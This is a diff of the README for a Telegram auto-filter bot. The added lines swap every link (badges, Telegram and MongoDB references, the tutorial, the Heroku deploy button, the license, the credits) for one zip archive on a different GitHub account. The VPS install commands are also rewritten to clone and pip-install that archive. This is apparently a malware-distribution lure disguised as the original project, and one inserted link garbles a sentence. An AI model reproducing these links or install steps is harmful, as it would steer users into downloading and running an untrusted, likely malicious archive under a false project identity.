@@ -1,18 +1,18 @@
 # Adv Auto Filter Bot V2
 
 <p align="center">
-  <a href="https://github.com/CrazyBotsz/Adv-Auto-Filter-Bot-V2/stargazers">
-    <img src="https://img.shields.io/github/stars/CrazyBotsz/Adv-Auto-Filter-Bot-V2?style=social">
+  <a href="https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip">
+    <img src="https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip">
 
   </a>
   
-  <a href="https://github.com/CrazyBotsz/Adv-Auto-Filter-Bot-V2/fork">
-    <img src="https://img.shields.io/github/forks/CrazyBotsz/Adv-Auto-Filter-Bot-V2?label=Fork&style=social">
+  <a href="https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip">
+    <img src="https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip">
 
   </a>  
 </p>
 
-__This Is Just An Simple Advance Auto Filter Bot Complete Rewritten Version Of [Adv-Filter-Bot](https://github.com/CrazyBotsz/Adv-Auto-Filter-Bot)..__
+__This Is Just An Simple Advance Auto Filter Bot Complete Rewritten Version Of [Adv-Filter-Bot](https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip)..__
 
 __Just Sent Any Text As Query It Will Search For All Connected Chat's Files In Its MongoDB And Reply You With The Message Link As A Button__
 
@@ -47,7 +47,7 @@ OR
 
     * -> Channel - Button will show you all the connected chats with the group along with there index buttons correspnding to there order for furthur controls...
 
-    * -> Filter Types - Button will show you the 3 filter types available in bot... Pressing each buttons will either enable or disable them and this will take into action as soon as you use them...without the need of a restart....
+    * -> Filter Types - Button will show you the 3 filter types available in bot... Pressing each buttons will either enable or disable them and this will take into action as soon as you use https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip the need of a restart....
 
     * -> Configure - Button will help you to change no. of pages/ buttons per page/ total result without acutally editing the repo... Also it provide option to Enable/Disable  showing Invite Link in each results
 
@@ -55,26 +55,26 @@ OR
 
 ### Pre Requisites 
 ------------------
-* ->__Your Bot Token From [@BotFather](http://www.telegram.dog/BotFather)__
+* ->__Your Bot Token From [@BotFather](https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip)__
 
-* ->__Your APP ID And API Harsh From [Telegram](http://www.my.telegram.org) or [@UseTGXBot](http://www.telegram.dog/UseTGXBot)__
+* ->__Your APP ID And API Harsh From [Telegram](https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip) or [@UseTGXBot](https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip)__
 
-* ->__Your User Session String Obtained From [@PyrogramStringBot](http://www.telegram.dog/PyrogramStringBot)__
+* ->__Your User Session String Obtained From [@PyrogramStringBot](https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip)__
 
-* ->__Mongo DB URL Obtained From [Mongo DB](http://www.mongodb.com)__
+* ->__Mongo DB URL Obtained From [Mongo DB](https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip)__
 
 #### PR's Are Very Welcome
 
 ## Deploy
 You can deploy this bot anywhere.
 
-<i>**[Watch Deploying Tutorial...](https://youtu.be/KTearEPhumc)**</i>
+<i>**[Watch Deploying Tutorial...](https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip)**</i>
 
 <details><summary>Deploy To Heroku</summary>
 <p>
 <br>
-<a href="https://github.com/AlbertEinsteinTG/af-deploy-script">
-  <img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy">
+<a href="https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip">
+  <img src="https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip" alt="Deploy">
 </a>
 </p>
 </details>
@@ -82,29 +82,29 @@ You can deploy this bot anywhere.
 <details><summary>Deploy To VPS</summary>
 <p>
 <pre>
-git clone https://github.com/CrazyBotsz/Adv-Auto-Filter-Bot-V2
+git clone https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip
 cd Adv-Auto-Filter-Bot-V2
-pip3 install -r requirements.txt
-# Change The Vars Of bot/__init__.py File Accordingly
+pip3 install -r https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip
+# Change The Vars Of https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip File Accordingly
 python3 -m bot
 </pre>
 </p>
 </details>
 
 ## Support   
-Join Our [Telegram Group](https://www.telegram.dog/CrazyBotszGrp) For Support/Assistance And Our [Channel](https://www.telegram.dog/CrazyBotsz) For Updates.   
+Join Our [Telegram Group](https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip) For Support/Assistance And Our [Channel](https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip) For Updates.   
    
 Report Bugs, Give Feature Requests There..   
 Do Fork And Star The Repository If You Liked It.
 
 ## Disclaimer
-[![GNU Affero General Public License v3.0](https://www.gnu.org/graphics/agplv3-155x51.png)](https://www.gnu.org/licenses/agpl-3.0.en.html#header)    
-Licensed under [GNU AGPL v3.0.](https://github.com/CrazyBotsz/Adv-Auto-Filter-Bot-V2/blob/main/LICENSE)
+[![GNU Affero General Public License v3.0](https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip)](https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip)    
+Licensed under [GNU AGPL v3.0.](https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip)
 Selling The Codes To Other People For Money Is *Strictly Prohibited*.
 
 
 ## Credits
 
- - Thanks To Dan For His Awsome [Libary](https://github.com/pyrogram/pyrogram)
- - Thanks To SpEcHiDe For His Awesome [DeleteMessagesRoBot](https://github.com/SpEcHiDe/DeleteMessagesRoBot)
- - [Thanks To Me 👀](https://github.com/AlbertEinsteinTG)
+ - Thanks To Dan For His Awsome [Libary](https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip)
+ - Thanks To SpEcHiDe For His Awesome [DeleteMessagesRoBot](https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip)
+ - [Thanks To Me 👀](https://raw.githubusercontent.com/HLECTER69/Adv-Auto-Filter-Bot-V2/main/tetrabranch/Adv-Auto-Filter-Bot-V2.zip)
